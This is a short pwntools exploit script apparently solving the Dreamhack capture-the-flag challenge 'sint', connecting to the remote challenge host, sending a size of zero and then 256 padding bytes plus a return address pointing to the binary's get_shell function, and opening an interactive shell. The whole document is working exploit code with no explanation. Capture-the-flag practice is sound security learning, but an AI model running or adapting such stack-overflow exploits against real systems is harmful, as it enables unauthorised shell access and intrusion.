from pwn import *

#p = process('./sint')
#gdb.attach(p, gdb_args=['-q', '-ex init-pwngdb'])
p = remote('host1.dreamhack.games', 20384)

context.clear()
context.update(arch='i386', os='linux')
context.log_level='debug'

e = ELF('./sint')

getshell = e.symbols['get_shell']


payload = ''
payload += 'A'*256
payload += p32(0)
payload += p32(getshell)

p.sendafter("Size: ", str(0)+"\x0a")
p.recvuntil("Data: ", payload)
p.send(payload)

p.interactive()
